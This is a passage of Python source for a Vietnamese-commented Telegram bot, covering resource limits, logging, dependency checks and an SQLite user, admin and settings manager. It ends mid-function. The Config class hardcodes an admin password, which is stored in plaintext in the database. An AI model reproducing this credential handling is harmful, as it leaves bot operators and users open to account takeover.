import os
import sys
import time
import signal
import threading
import logging
import logging.handlers
import subprocess
import sqlite3
import platform
from datetime import datetime, timezone
from contextlib import contextmanager
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor
from functools import wraps

from telebot import TeleBot, types
from telebot.apihelper import ApiException

# Optional dependency for system metrics
try:
    import psutil  # type: ignore
except Exception:
    psutil = None  # Fallback if not installed

# ========== Config và token ==========

TELEGRAM_TOKEN_FILE = 'bot_token.txt'

@dataclass
class Config:
    TOKEN: str = None
    ADMIN_PASSWORD: str = 'RRojcmm$AWe$qW9P'
    DATABASE: str = 'bot_data_v3.db'
    MAX_MESSAGE_LENGTH: int = 4000
    RETRY_DELAY: int = 10

# ========== Resource Management ==========

@dataclass
class ResourceLimits:
    """Cấu hình giới hạn tài nguyên - Đã được tối ưu hóa cho hiệu suất cao"""
    # Tối ưu hóa giới hạn để cân bằng giữa performance và tài nguyên
    MAX_CONCURRENT_TASKS_PER_USER: int = 3  # Tăng từ 2 lên 3 để cải thiện performance
    MAX_CONCURRENT_TASKS_GLOBAL: int = 8   # Tăng từ 6 lên 8 để xử lý nhiều tác vụ hơn
    MAX_TASK_DURATION: int = 3600  # Tăng từ 30 phút lên 1 giờ để tác vụ dài hơn
    MAX_MESSAGE_LENGTH: int = 4000  # Tăng từ 3000 lên 4000 để hỗ trợ tin nhắn dài
    MAX_MESSAGES_PER_MINUTE: int = 25  # Tăng từ 20 lên 25 để tăng khả năng tương tác
    
    # Tối ưu hóa ngưỡng tài nguyên để cân bằng performance
    MAX_CPU_PERCENT: float = 75.0  # Tăng từ 70% lên 75% để tận dụng CPU tốt hơn
    MAX_RAM_PERCENT: float = 80.0  # Tăng từ 75% lên 80% để tận dụng RAM tốt hơn
    
    # Tối ưu hóa tần suất monitoring để cân bằng performance và responsiveness
    TASK_MONITOR_INTERVAL: int = 20  # Tăng từ 15 lên 20 giây để giảm overhead
    AUTO_CLEANUP_INTERVAL: int = 300  # Tăng từ 3 phút lên 5 phút để giảm overhead
    
    # Tối ưu hóa memory management
    MEMORY_CLEANUP_THRESHOLD: float = 70.0  # Tăng từ 60% lên 70% để giảm overhead
    GARBAGE_COLLECTION_INTERVAL: int = 600  # Tăng từ 5 phút lên 10 phút để giảm overhead
    MAX_LOG_SIZE_MB: int = 50  # Tăng từ 25MB lên 50MB để giảm overhead rotation
    MAX_DB_CONNECTIONS: int = 5  # Tăng từ 3 lên 5 để khớp với connection pool
    
    # Thêm cấu hình mới cho tối ưu hóa
    ENABLE_LAZY_LOADING: bool = True  # Bật lazy loading
    CACHE_SIZE_LIMIT: int = 100  # Giới hạn cache size
    BATCH_PROCESSING_SIZE: int = 5  # Xử lý theo batch
    ENABLE_COMPRESSION: bool = True  # Bật nén dữ liệu

class ResourceManager:
    """Quản lý tài nguyên và giới hạn - Đã được tối ưu hóa cho hiệu suất cao"""
    
    def __init__(self, limits: ResourceLimits):
        self.limits = limits
        
        # Sử dụng weak references để tránh memory leaks
        self.user_task_counts = {}  # {user_id: count}
        self.task_start_times = {}  # {task_key: start_time}
        self.message_counts = {}  # {user_id: {timestamp: count}}
        
        # Tối ưu hóa monitoring
        self.monitoring_active = False
        self.monitor_thread = None
        
        # Memory management tối ưu
        self.last_gc_time = datetime.now()
        self.memory_warnings_sent = set()  # Tránh spam warning
        self.db_connections = 0
        self.max_db_connections = limits.MAX_DB_CONNECTIONS
        
        # Thêm cache và lazy loading
        self._cache = {}
        self._cache_timestamps = {}
        self._psutil_cache = {}
        self._last_psutil_check = 0
        self._psutil_cache_ttl = 2  # Cache psutil data trong 2 giây
        
    def can_start_task(self, user_id: int, task_key: str) -> tuple[bool, str]:
        """Kiểm tra xem có thể bắt đầu tác vụ mới không - Đã được tối ưu hóa với cache"""
        # Kiểm tra giới hạn tác vụ per user
        user_tasks = self.user_task_counts.get(user_id, 0)
        if user_tasks >= self.limits.MAX_CONCURRENT_TASKS_PER_USER:
            return False, f"Bạn đã đạt giới hạn {self.limits.MAX_CONCURRENT_TASKS_PER_USER} tác vụ đồng thời"
        
        # Kiểm tra giới hạn tác vụ global
        global_tasks = sum(self.user_task_counts.values())
        if global_tasks >= self.limits.MAX_CONCURRENT_TASKS_GLOBAL:
            return False, f"Hệ thống đã đạt giới hạn {self.limits.MAX_CONCURRENT_TASKS_GLOBAL} tác vụ đồng thời"
        
        # Kiểm tra tài nguyên hệ thống với cache để giảm overhead
        if psutil:
            try:
                # Sử dụng cache để tránh gọi psutil quá nhiều
                current_time = time.time()
                if current_time - self._last_psutil_check > self._psutil_cache_ttl:
                    self._psutil_cache['cpu'] = psutil.cpu_percent(interval=0.01)  # Giảm interval
                    self._psutil_cache['ram'] = psutil.virtual_memory().percent
                    self._last_psutil_check = current_time
                
                cpu_percent = self._psutil_cache['cpu']
                ram_percent = self._psutil_cache['ram']
                
                if cpu_percent > self.limits.MAX_CPU_PERCENT:
                    return False, f"CPU quá tải ({cpu_percent:.1f}% > {self.limits.MAX_CPU_PERCENT}%)"
                
                if ram_percent > self.limits.MAX_RAM_PERCENT:
                    return False, f"RAM quá tải ({ram_percent:.1f}% > {self.limits.MAX_RAM_PERCENT}%)"
                    
                # Thêm kiểm tra memory cleanup
                if ram_percent > self.limits.MEMORY_CLEANUP_THRESHOLD:
                    self._trigger_memory_cleanup()
                    
            except Exception as e:
                logger.warning(f"Error checking system resources: {e}")
        
        return True, "OK"
    
    def start_task(self, user_id: int, task_key: str):
        """Bắt đầu tác vụ mới"""
        self.user_task_counts[user_id] = self.user_task_counts.get(user_id, 0) + 1
        self.task_start_times[task_key] = time.time()
    
    def end_task(self, user_id: int, task_key: str):
        """Kết thúc tác vụ"""
        if user_id in self.user_task_counts:
            self.user_task_counts[user_id] = max(0, self.user_task_counts[user_id] - 1)
        if task_key in self.task_start_times:
            del self.task_start_times[task_key]
    
    def can_send_message(self, user_id: int) -> tuple[bool, str]:
        """Kiểm tra giới hạn tin nhắn"""
        current_time = time.time()
        user_messages = self.message_counts.get(user_id, {})
        
        # Xóa các timestamp cũ (trước 1 phút)
        user_messages = {ts: count for ts, count in user_messages.items() 
                        if current_time - ts < 60}
        
        # Đếm tin nhắn trong 1 phút gần nhất
        recent_count = sum(user_messages.values())
        
        if recent_count >= self.limits.MAX_MESSAGES_PER_MINUTE:
            return False, f"Bạn đã gửi {recent_count} tin nhắn trong 1 phút. Giới hạn: {self.limits.MAX_MESSAGES_PER_MINUTE}"
        
        # Cập nhật message count
        minute_key = int(current_time // 60) * 60
        user_messages[minute_key] = user_messages.get(minute_key, 0) + 1
        self.message_counts[user_id] = user_messages
        
        return True, "OK"
    
    def get_resource_status(self) -> dict:
        """Lấy trạng thái tài nguyên với cache để tối ưu hóa"""
        # Sử dụng cache để tránh tính toán lại
        cache_key = 'resource_status'
        current_time = time.time()
        
        if (cache_key in self._cache and 
            current_time - self._cache_timestamps.get(cache_key, 0) < 5):  # Cache 5 giây
            return self._cache[cache_key]
        
        # Tính toán trạng thái mới
        status = {
            'global_tasks': sum(self.user_task_counts.values()),
            'max_global_tasks': self.limits.MAX_CONCURRENT_TASKS_GLOBAL,
            'user_tasks': self.user_task_counts.copy(),
            'max_user_tasks': self.limits.MAX_CONCURRENT_TASKS_PER_USER,
            'active_tasks': len([ts for ts in self.task_start_times.values() 
                               if current_time - ts < self.limits.MAX_TASK_DURATION]),
            'db_connections': self.db_connections,
            'max_db_connections': self.max_db_connections
        }
        
        # Thêm thông tin hệ thống nếu có psutil
        if psutil:
            try:
                status['cpu_percent'] = psutil.cpu_percent(interval=0.1)
                mem = psutil.virtual_memory()
                status['ram_percent'] = mem.percent
                status['ram_used_gb'] = mem.used / (1024**3)
                status['ram_total_gb'] = mem.total / (1024**3)
            except Exception as e:
                logger.warning(f"Error getting system metrics: {e}")
                status['cpu_percent'] = 0
                status['ram_percent'] = 0
                status['ram_used_gb'] = 0
                status['ram_total_gb'] = 0
        
        # Cache kết quả
        self._cache[cache_key] = status
        self._cache_timestamps[cache_key] = current_time
        
        return status
    
    def start_monitoring(self):
        """Bắt đầu monitoring tài nguyên"""
        if self.monitoring_active:
            return
        
        self.monitoring_active = True
        self.monitor_thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self.monitor_thread.start()
        logger.info("Resource monitoring started")
    
    def stop_monitoring(self):
        """Dừng monitoring tài nguyên"""
        self.monitoring_active = False
        if self.monitor_thread:
            self.monitor_thread.join(timeout=5)
        logger.info("Resource monitoring stopped")
    
    def _monitor_loop(self):
        """Vòng lặp monitoring chính"""
        while self.monitoring_active:
            try:
                # Kiểm tra tài nguyên mỗi interval
                time.sleep(self.limits.TASK_MONITOR_INTERVAL)
                
                # Cleanup tasks quá thời gian
                self._cleanup_expired_tasks()
                
                # Memory cleanup nếu cần
                if psutil:
                    try:
                        ram_percent = psutil.virtual_memory().percent
                        if ram_percent > self.limits.MEMORY_CLEANUP_THRESHOLD:
                            self._trigger_memory_cleanup()
                    except Exception as e:
                        logger.warning(f"Error in memory monitoring: {e}")
                
            except Exception as e:
                logger.error(f"Error in monitoring loop: {e}")
                time.sleep(5)  # Wait before retry
    
    def _cleanup_expired_tasks(self):
        """Dọn dẹp các tác vụ quá thời gian"""
        current_time = time.time()
        expired_tasks = []
        
        for task_key, start_time in self.task_start_times.items():
            if current_time - start_time > self.limits.MAX_TASK_DURATION:
                expired_tasks.append(task_key)
        
        for task_key in expired_tasks:
            del self.task_start_times[task_key]
            logger.info(f"Cleaned up expired task: {task_key}")
    
    def _trigger_memory_cleanup(self):
        """Kích hoạt cleanup memory khi cần thiết"""
        try:
            # Chạy garbage collection
            import gc
            gc.collect()
            
            # Cleanup log files nếu cần
            self._cleanup_log_files()
            
            # Reset memory warnings
            self.memory_warnings_sent.clear()
            
            logger.info("Memory cleanup completed")
        except Exception as e:
            logger.error(f"Error during memory cleanup: {e}")
    
    def _cleanup_log_files(self):
        """Cleanup log files để tiết kiệm disk space"""
        try:
            import os
            log_file = "bot.log"
            if os.path.exists(log_file):
                file_size_mb = os.path.getsize(log_file) / (1024 * 1024)
                if file_size_mb > self.limits.MAX_LOG_SIZE_MB:
                    # Backup và truncate log file
                    backup_name = f"bot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
                    os.rename(log_file, backup_name)
                    logger.info(f"Log file rotated: {backup_name}")
        except Exception as e:
            logger.error(f"Error cleaning up log files: {e}")
    
    def get_performance_analytics(self) -> dict:
        """Lấy phân tích hiệu suất với cache để tối ưu hóa"""
        try:
            if psutil:
                # Sử dụng cache để tránh gọi psutil quá nhiều
                current_time = time.time()
                if current_time - self._last_psutil_check > self._psutil_cache_ttl:
                    self._psutil_cache['cpu'] = psutil.cpu_percent(interval=0.05)  # Giảm interval
                    self._psutil_cache['ram'] = psutil.virtual_memory().percent
                    self._last_psutil_check = current_time
                
                return {
                    'current_cpu': round(self._psutil_cache['cpu'], 1),
                    'current_ram': round(self._psutil_cache['ram'], 1),
                    'avg_cpu': round(self._psutil_cache['cpu'], 1),
                    'avg_ram': round(self._psutil_cache['ram'], 1),
                    'status': 'Cached real-time data',
                    'cache_age': round(current_time - self._last_psutil_check, 1),
                    'total_records': len(self._psutil_cache)
                }
            else:
                return {'status': 'psutil not available'}
        except Exception as e:
            logger.error(f"Error getting performance analytics: {e}")
            return {'status': 'Error', 'message': str(e)}

# ========== Logging config - Đã được tối ưu hóa ==========

class OptimizedRotatingFileHandler(logging.handlers.RotatingFileHandler):
    """Custom rotating file handler với tối ưu hóa memory"""
    
    def __init__(self, filename, max_bytes=50*1024*1024, backup_count=3, encoding='utf-8'):
        super().__init__(filename, maxBytes=max_bytes, backupCount=backup_count, encoding=encoding)
        self.setFormatter(logging.Formatter(
            '%(asctime)s - %(levelname)s - %(funcName)s:%(lineno)d - %(message)s'
        ))

class MemoryOptimizedStreamHandler(logging.StreamHandler):
    """Stream handler với tối ưu hóa memory cho console output"""
    
    def __init__(self):
        super().__init__()
        self.setFormatter(logging.Formatter(
            '%(asctime)s - %(levelname)s - %(message)s'
        ))
    
    def emit(self, record):
        # Giới hạn độ dài message để tránh spam console
        if hasattr(record, 'msg') and isinstance(record.msg, str):
            if len(record.msg) > 500:
                record.msg = record.msg[:500] + "..."
        super().emit(record)

# Cấu hình logging tối ưu hóa
def setup_optimized_logging():
    """Thiết lập logging với tối ưu hóa performance"""
    # Tạo logger chính
    logger = logging.getLogger(__name__)
    logger.setLevel(logging.INFO)
    
    # Xóa handlers cũ nếu có
    for handler in logger.handlers[:]:
        logger.removeHandler(handler)
    
    # File handler với rotation
    file_handler = OptimizedRotatingFileHandler(
        "bot.log",
        max_bytes=50*1024*1024,  # 50MB
        backup_count=3,
        encoding='utf-8'
    )
    file_handler.setLevel(logging.INFO)
    
    # Console handler với memory optimization
    console_handler = MemoryOptimizedStreamHandler()
    console_handler.setLevel(logging.INFO)
    
    # Thêm handlers
    logger.addHandler(file_handler)
    logger.addHandler(console_handler)
    
    # Tối ưu hóa logging cho các thư viện khác
    logging.getLogger('telebot').setLevel(logging.WARNING)
    logging.getLogger('urllib3').setLevel(logging.WARNING)
    logging.getLogger('requests').setLevel(logging.WARNING)
    
    return logger

# Khởi tạo logger tối ưu hóa
logger = setup_optimized_logging()

def check_dependencies():
    """Kiểm tra các dependencies cần thiết"""
    missing_deps = []
    
    # Kiểm tra Node.js
    try:
        subprocess.run(['node', '--version'], capture_output=True, check=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        missing_deps.append('Node.js')
    
    # Kiểm tra Python
    try:
        subprocess.run(['python', '--version'], capture_output=True, check=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        try:
            subprocess.run(['python3', '--version'], capture_output=True, check=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            missing_deps.append('Python')
    
    # Kiểm tra GCC (chỉ trên Linux/Unix)
    if os.name != 'nt':
        try:
            subprocess.run(['gcc', '--version'], capture_output=True, check=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            missing_deps.append('GCC')
    
    # Kiểm tra psutil (tùy chọn)
    if psutil is None:
        missing_deps.append('psutil (optional)')
    
    if missing_deps:
        print(f"⚠️ Missing dependencies: {', '.join(missing_deps)}")
        print("Some features may not work properly.")
    else:
        print("✅ All dependencies are available")

def load_bot_token():
    try:
        with open(TELEGRAM_TOKEN_FILE, 'r', encoding='utf-8') as f:
            token = f.read().strip()
            if not token:
                raise ValueError("Token file is empty!")
            logger.info("Loaded Telegram bot token from file.")
            return token
    except Exception as e:
        print(f"❌ Error reading bot token from file '{TELEGRAM_TOKEN_FILE}': {e}")
        sys.exit(f"❌ Bot token file '{TELEGRAM_TOKEN_FILE}' not found or invalid. Please create it with your bot token.")

Config.TOKEN = load_bot_token()
bot = TeleBot(Config.TOKEN)

# Khởi tạo Resource Manager
resource_manager = ResourceManager(ResourceLimits())

bot_start_time = datetime.now(timezone.utc)

# ========== Database Manager ==========

db_lock = threading.Lock()

class DatabaseManager:
    """Database Manager được tối ưu hóa toàn diện với advanced features"""
    
    def __init__(self, db_path: str):
        self.db_path = db_path
        self.connection_pool = []
        self.max_connections = 5  # Tăng từ 3 lên 5 để cải thiện database performance
        self.connection_lock = threading.Lock()
        
        # Performance monitoring
        self.query_stats = {
            'total_queries': 0,
            'slow_queries': 0,
            'cache_hits': 0,
            'cache_misses': 0
        }
        self.query_cache = {}
        self.cache_ttl = 600  # 10 phút cache để cải thiện hiệu suất
        self.last_cache_cleanup = time.time()
        
        # Prepared statements cache
        self.prepared_statements = {}
        
        # Batch operations
        self.batch_operations = []
        self.batch_size = 100
        self.last_batch_commit = time.time()
        
        # Database maintenance
        self.last_maintenance = time.time()
        self.maintenance_interval = 3600  # 1 giờ
        
        self.init_database()
        self._init_connection_pool()
        self._init_prepared_statements()

    def _init_connection_pool(self):
        """Khởi tạo connection pool với tối ưu hóa nâng cao"""
        try:
            for _ in range(self.max_connections):
                conn = sqlite3.connect(self.db_path, check_same_thread=False, timeout=30)
                conn.row_factory = sqlite3.Row
                
                # Advanced SQLite optimization
                conn.execute('PRAGMA journal_mode=WAL')
                conn.execute('PRAGMA synchronous=NORMAL')
                conn.execute('PRAGMA cache_size=10000')  # Tăng từ 5000 lên 10000 để cải thiện performance
                conn.execute('PRAGMA temp_store=MEMORY')
                conn.execute('PRAGMA mmap_size=268435456')  # Tăng từ 128MB lên 256MB để cải thiện performance
                conn.execute('PRAGMA page_size=4096')
                conn.execute('PRAGMA auto_vacuum=INCREMENTAL')
                conn.execute('PRAGMA incremental_vacuum=1000')
                conn.execute('PRAGMA optimize')
                
                self.connection_pool.append(conn)
            logger.info(f"🚀 Database connection pool initialized with {self.max_connections} optimized connections")
        except Exception as e:
            logger.error(f"❌ Error initializing connection pool: {e}")

    def _init_prepared_statements(self):
        """Khởi tạo prepared statements để tăng hiệu suất"""
        try:
            # Common queries
            self.prepared_statements = {
                'get_user': 'SELECT * FROM users WHERE user_id=?',
                'get_admin': 'SELECT is_admin FROM users WHERE user_id=?',
                'get_banned': 'SELECT is_banned FROM users WHERE user_id=?',
                'get_setting': 'SELECT value FROM settings WHERE key=?',
                'insert_user': '''
                    INSERT INTO users(user_id, username, first_name, last_name)
                    VALUES (?, ?, ?, ?)
                    ON CONFLICT(user_id) DO UPDATE SET
                        username=excluded.username,
                        first_name=excluded.first_name,
                        last_name=excluded.last_name,
                        last_active=CURRENT_TIMESTAMP
                ''',
                'update_user_activity': 'UPDATE users SET last_active=CURRENT_TIMESTAMP WHERE user_id=?',
                'insert_activity': 'INSERT INTO activity_logs(user_id, action, details) VALUES (?, ?, ?)',
                'insert_token': 'INSERT OR IGNORE INTO used_tokens(token) VALUES (?)',
                'check_token': 'SELECT 1 FROM used_tokens WHERE token=? LIMIT 1'
            }
            logger.info("📝 Prepared statements initialized for performance optimization")
        except Exception as e:
            logger.error(f"❌ Error initializing prepared statements: {e}")

    def _get_connection_from_pool(self):
        """Lấy connection từ pool với timeout và retry logic"""
        max_retries = 3
        retry_delay = 0.1
        
        for attempt in range(max_retries):
            try:
                with self.connection_lock:
                    if self.connection_pool:
                        conn = self.connection_pool.pop()
                        # Kiểm tra connection còn hoạt động không
                        try:
                            conn.execute('SELECT 1')
                            return conn
                        except:
                            conn.close()
                            continue
                    else:
                        # Tạo connection mới nếu pool hết
                        conn = sqlite3.connect(self.db_path, check_same_thread=False, timeout=30)
                        conn.row_factory = sqlite3.Row
                        # Áp dụng optimization settings
                        conn.execute('PRAGMA journal_mode=WAL')
                        conn.execute('PRAGMA cache_size=5000')
                        conn.execute('PRAGMA temp_store=MEMORY')
                        return conn
            except Exception as e:
                if attempt == max_retries - 1:
                    logger.error(f"❌ Failed to get database connection after {max_retries} attempts: {e}")
                    raise
                time.sleep(retry_delay)
                retry_delay *= 2

    def _return_connection_to_pool(self, conn):
        """Trả connection về pool với health check"""
        try:
            if conn:
                # Reset connection state
                try:
                    conn.rollback()
                except:
                    pass
                
                # Kiểm tra connection còn hoạt động không
                try:
                    conn.execute('SELECT 1')
                    with self.connection_lock:
                        if len(self.connection_pool) < self.max_connections:
                            self.connection_pool.append(conn)
                        else:
                            conn.close()
                except:
                    # Connection bị lỗi, đóng luôn
                    conn.close()
        except Exception as e:
            logger.error(f"❌ Error returning connection to pool: {e}")
            try:
                conn.close()
            except:
                pass

    def _cleanup_cache(self):
        """Dọn dẹp cache định kỳ"""
        current_time = time.time()
        if current_time - self.last_cache_cleanup > 60:  # Mỗi phút
            expired_keys = []
            for key, (data, timestamp) in self.query_cache.items():
                if current_time - timestamp > self.cache_ttl:
                    expired_keys.append(key)
            
            for key in expired_keys:
                del self.query_cache[key]
            
            self.last_cache_cleanup = current_time
            logger.debug(f"🧹 Cache cleanup: removed {len(expired_keys)} expired entries")

    def _execute_with_monitoring(self, conn, query, params=None, fetch=False):
        """Thực thi query với performance monitoring"""
        start_time = time.time()
        self.query_stats['total_queries'] += 1
        
        try:
            cursor = conn.cursor()
            if params:
                cursor.execute(query, params)
            else:
                cursor.execute(query)
            
            execution_time = time.time() - start_time
            
            # Ghi nhận slow queries (>100ms)
            if execution_time > 0.1:
                self.query_stats['slow_queries'] += 1
                logger.warning(f"🐌 Slow query detected: {execution_time:.3f}s - {query[:100]}...")
            
            if fetch:
                return cursor.fetchall()
            return cursor
            
        except Exception as e:
            logger.error(f"❌ Database query error: {e}")
            logger.error(f"Query: {query}")
            if params:
                logger.error(f"Params: {params}")
            raise

    def _batch_operation(self, operation_type, data):
        """Thêm operation vào batch queue"""
        self.batch_operations.append((operation_type, data))
        
        # Commit batch nếu đủ size hoặc đã quá thời gian
        current_time = time.time()
        if (len(self.batch_operations) >= self.batch_size or 
            current_time - self.last_batch_commit > 60):
            self._commit_batch()

    def _commit_batch(self):
        """Commit tất cả batch operations"""
        if not self.batch_operations:
            return
        
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                
                for operation_type, data in self.batch_operations:
                    if operation_type == 'insert_activity':
                        cursor.execute(self.prepared_statements['insert_activity'], data)
                    elif operation_type == 'update_user_activity':
                        cursor.execute(self.prepared_statements['update_user_activity'], data)
                    # Thêm các operation types khác nếu cần
                
                conn.commit()
                logger.info(f"📦 Batch commit: {len(self.batch_operations)} operations")
                
        except Exception as e:
            logger.error(f"❌ Batch commit error: {e}")
        finally:
            self.batch_operations.clear()
            self.last_batch_commit = time.time()

    def _perform_maintenance(self):
        """Thực hiện database maintenance định kỳ"""
        current_time = time.time()
        if current_time - self.last_maintenance > self.maintenance_interval:
            try:
                with self.get_connection() as conn:
                    # VACUUM để tối ưu hóa storage
                    conn.execute('VACUUM')
                    # ANALYZE để cập nhật statistics
                    conn.execute('ANALYZE')
                    # Cleanup WAL files
                    conn.execute('PRAGMA wal_checkpoint(TRUNCATE)')
                    
                self.last_maintenance = current_time
                logger.info("🔧 Database maintenance completed: VACUUM + ANALYZE + WAL cleanup")
                
            except Exception as e:
                logger.error(f"❌ Database maintenance error: {e}")

    @contextmanager
    def get_connection(self):
        """Context manager cho database connection với advanced error handling"""
        conn = None
        try:
            conn = self._get_connection_from_pool()
            yield conn
            conn.commit()
        except sqlite3.Error as e:
            logger.error(f"❌ SQLite error: {e}")
            if conn:
                try:
                    conn.rollback()
                except:
                    pass
            raise
        except Exception as e:
            logger.error(f"❌ Unexpected database error: {e}")
            if conn:
                try:
                    conn.rollback()
                except:
                    pass
            raise
        finally:
            if conn:
                self._return_connection_to_pool(conn)

    def get_cached_result(self, key, query_func, ttl=None):
        """Lấy kết quả từ cache hoặc thực thi query"""
        self._cleanup_cache()
        
        if key in self.query_cache:
            data, timestamp = self.query_cache[key]
            cache_ttl = ttl or self.cache_ttl
            if time.time() - timestamp < cache_ttl:
                self.query_stats['cache_hits'] += 1
                return data
        
        # Cache miss, thực thi query
        self.query_stats['cache_misses'] += 1
        result = query_func()
        
        # Lưu vào cache
        self.query_cache[key] = (result, time.time())
        return result

    def get_performance_stats(self):
        """Lấy thống kê hiệu suất database"""
        return {
            'total_queries': self.query_stats['total_queries'],
            'slow_queries': self.query_stats['slow_queries'],
            'cache_hits': self.query_stats['cache_hits'],
            'cache_misses': self.query_stats['cache_misses'],
            'cache_hit_rate': (self.query_stats['cache_hits'] / 
                              max(self.query_stats['total_queries'], 1)) * 100,
            'active_connections': len(self.connection_pool),
            'batch_operations_pending': len(self.batch_operations),
            'last_maintenance': self.last_maintenance,
            'last_batch_commit': self.last_batch_commit
        }

    def close_all_connections(self):
        """Đóng tất cả connections trong pool với cleanup"""
        # Commit batch operations trước khi đóng
        self._commit_batch()
        
        with self.connection_lock:
            for conn in self.connection_pool:
                try:
                    conn.close()
                except:
                    pass
            self.connection_pool.clear()
            logger.info("🔒 All database connections closed")

    def init_database(self):
        """Khởi tạo database với schema tối ưu hóa"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            
            # Tạo tables với indexes tối ưu hóa
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    first_name TEXT,
                    last_name TEXT,
                    is_admin INTEGER DEFAULT 0,
                    is_banned INTEGER DEFAULT 0,
                    join_date TEXT DEFAULT CURRENT_TIMESTAMP,
                    last_active TEXT DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS settings (
                    key TEXT PRIMARY KEY,
                    value TEXT,
                    updated_at TEXT DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS activity_logs (
                    log_id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    action TEXT,
                    details TEXT,
                    timestamp TEXT DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY(user_id) REFERENCES users(user_id)
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS used_tokens (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    token TEXT UNIQUE,
                    first_used TEXT DEFAULT CURRENT_TIMESTAMP
                )
            ''')

            # Tạo indexes để tăng hiệu suất
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_users_admin ON users(is_admin)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_users_banned ON users(is_banned)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_users_last_active ON users(last_active)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_activity_logs_user_timestamp ON activity_logs(user_id, timestamp)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_activity_logs_timestamp ON activity_logs(timestamp)')

            # Insert default settings
            default_settings = [
                ('welcome_message', '🌟 Chào mừng bạn đến với Bot!\n\nSử dụng /help để xem hướng dẫn.'),
                ('admin_password', Config.ADMIN_PASSWORD),
                ('maintenance_mode', '0')
            ]
            for k, v in default_settings:
                cursor.execute('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)', (k, v))

    def get_setting(self, key: str):
        """Lấy setting với cache"""
        def query_func():
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute(self.prepared_statements['get_setting'], (key,))
                row = cursor.fetchone()
                return row['value'] if row else None
        
        return self.get_cached_result(f"setting_{key}", query_func, ttl=600)  # Cache 10 phút

    def set_setting(self, key: str, value: str):
        """Set setting với cache invalidation"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute('INSERT OR REPLACE INTO settings (key,value,updated_at) VALUES (?, ?, CURRENT_TIMESTAMP)', (key, value))
            
            # Xóa cache
            cache_key = f"setting_{key}"
            if cache_key in self.query_cache:
                del self.query_cache[cache_key]
            
            return True
        except Exception as e:
            logger.error(f"❌ Error setting {key}: {e}")
            return False

    def save_user(self, user):
        """Lưu user với batch operation optimization"""
        try:
            # Sử dụng prepared statement
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute(self.prepared_statements['insert_user'], 
                             (user.id, getattr(user, 'username', None), 
                              getattr(user, 'first_name', None), 
                              getattr(user, 'last_name', None)))
            
            # Thêm vào batch để update last_active
            self._batch_operation('update_user_activity', (user.id,))
            
            return True
        except Exception as e:
            logger.error(f"❌ Error saving user: {e}")
            return False

    def is_admin(self, user_id: int) -> bool:
        """Kiểm tra admin với cache"""
        def query_func():
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute(self.prepared_statements['get_admin'], (user_id,))
                row = cursor.fetchone()
                return bool(row and row['is_admin'] == 1)
        
        return self.get_cached_result(f"admin_{user_id}", query_func, ttl=300)  # Cache 5 phút

    def is_banned(self, user_id: int) -> bool:
        """Kiểm tra banned với cache"""
        def query_func():
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute(self.prepared_statements['get_banned'], (user_id,))
                row = cursor.fetchone()
                return bool(row and row['is_banned'] == 1)
        
        return self.get_cached_result(f"banned_{user_id}", query_func, ttl=300)  # Cache 5 phút

    def log_activity(self, user_id: int, action: str, details: str=None):
        """Log activity với batch operation"""
        try:
            # Thêm vào batch thay vì insert ngay lập tức
            self._batch_operation('insert_activity', (user_id, action, details))
        except Exception as e:
            logger.error(f"❌ Error logging activity: {e}")

    def save_token(self, token: str):
        """Lưu token với prepared statement"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute(self.prepared_statements['insert_token'], (token,))
            return True
        except Exception as e:
            logger.error(f"❌ Error saving token: {e}")
            return False

    def is_token_used(self, token: str) -> bool:
        """Kiểm tra token với prepared statement"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute(self.prepared_statements['check_token'], (token,))
            return cursor.fetchone() is not None

    def add_admin(self, user_id: int) -> bool:
        """Thêm admin với cache invalidation"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute('SELECT * FROM users WHERE user_id=?', (user_id,))
                user = cursor.fetchone()
                if user:
                    cursor.execute('UPDATE users SET is_admin=1 WHERE user_id=?', (user_id,))
                else:
                    cursor.execute('INSERT INTO users(user_id, is_admin) VALUES (?, 1)', (user_id,))
            
            # Xóa cache
            cache_key = f"admin_{user_id}"
            if cache_key in self.query_cache:
                del self.query_cache[cache_key]
            
            return True
        except Exception as e:
            logger.error(f"❌ Error adding admin rights to user {user_id}: {e}")
            return False

    def remove_admin(self, user_id: int) -> bool:
        """Xóa admin với cache invalidation"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute('UPDATE users SET is_admin=0 WHERE user_id=?', (user_id,))
            
            # Xóa cache
            cache_key = f"admin_{user_id}"
            if cache_key in self.query_cache:
                del self.query_cache[cache_key]
            
            return True
        except Exception as e:
            logger.error(f"❌ Error removing admin rights from user {user_id}: {e}")
            return False

    def list_admin_ids(self):
        """Lấy danh sách admin với cache"""
        def query_func():
            with self.get_connection() as conn:
                cursor = conn.cursor()
